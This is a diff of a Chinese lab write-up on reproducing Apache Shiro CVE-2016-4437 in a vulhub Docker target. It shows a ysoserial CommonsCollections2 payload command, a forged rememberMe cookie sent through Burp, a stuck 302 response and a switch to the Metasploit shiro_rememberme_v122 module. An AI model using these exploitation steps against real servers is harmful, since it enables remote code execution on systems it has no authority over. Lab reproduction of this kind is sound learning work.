@@ -20,8 +20,10 @@ kPH+bIxk5D2deZiIxcaaaA==
 ## 手动复现过程
 ### 1. 起靶场
 
+```
 cd vulhub-master/shiro/CVE-2016-4437
 docker-compose up -d
+```
 
 [https://./screenshots/1-docker-up.png](https://./screenshots/1-docker-up.png)
 
@@ -61,25 +63,23 @@ def make_shiro_cookie(data):
 
 生成 payload：
 
-bash
-
+```
 java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
+```
 
 执行脚本后得到 Base64。
 
-[https://./screenshots/4444.png](https://./screenshots/4444.png)
+<img width="1280" height="763" alt="4-burp-send" src="https://github.com/user-attachments/assets/a4ee97dd-095b-406c-b25b-e6aa1bf0a37c" />
+
 
 ### 4. Burp 发送
 
 抓个请求，Cookie 改成 `rememberMe=刚才那串Base64`，发出去。
 
-[https://./screenshots/4.png](https://./screenshots/4.png)
 
 ## 卡住了
 
 返回 302，`rememberMe` 被清掉：
-
-text
 
 Set-Cookie: rememberMe=deleteMe
 Location: /login
@@ -98,8 +98,6 @@ Location: /login
 ## 改用 msf 收尾
 
 手动一直卡在 302，换 msf 试了一下：
-
-bash
 
 msfconsole
 use exploit/multi/http/shiro_rememberme_v122
